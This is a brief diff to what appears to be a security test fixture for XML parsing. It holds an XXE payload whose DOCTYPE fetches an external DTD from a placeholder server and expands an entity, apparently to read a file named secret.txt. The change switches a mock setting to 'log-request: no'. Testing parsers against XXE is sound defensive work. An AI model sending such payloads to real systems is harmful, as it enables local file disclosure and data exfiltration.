@@ -9,7 +9,7 @@ path: secret.txt
 
 [ServerResponse /doctype-pe.dtd]
 content: doctype-pe.dtd
-access_allowed: True
+log-request: no
 -->
 <!DOCTYPE data SYSTEM "http://{server_address}/doctype-pe.dtd">
 <data>&all;</data>
